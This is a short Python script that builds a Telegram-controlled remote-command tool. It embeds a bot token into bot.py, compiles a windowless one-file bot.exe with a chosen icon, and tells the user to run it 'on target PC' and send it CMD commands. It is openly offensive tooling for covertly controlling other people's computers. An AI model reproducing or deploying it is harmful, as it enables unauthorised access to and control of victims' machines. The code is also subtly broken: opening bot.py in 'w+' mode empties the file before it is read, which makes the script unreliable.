import os
os.system('pip install -r requirements.txt')
icon = input('Use default file icon or your own icon (D for default, path to file for use your local icon) => ')
token = input('Telegram Bot API token => ')
if icon == 'D' or icon == '':
    icon = "bot.ico"
else:
  icon = icon
with open('bot.py', 'w+') as file:
    new_content = file.read().replace('<token>', token)
    file.write(new_content)
print('Building EXE file...')
try:
    assert os.system(f'pyinstaller --icon {icon} -w --onefile bot.py') == 0
    os.rename('dist/bot.exe', 'bot.exe')
    print('Run bot.exe on target PC and send CMD commands to your telegram bot!')
except:
    print('Error while creating EXE file.')
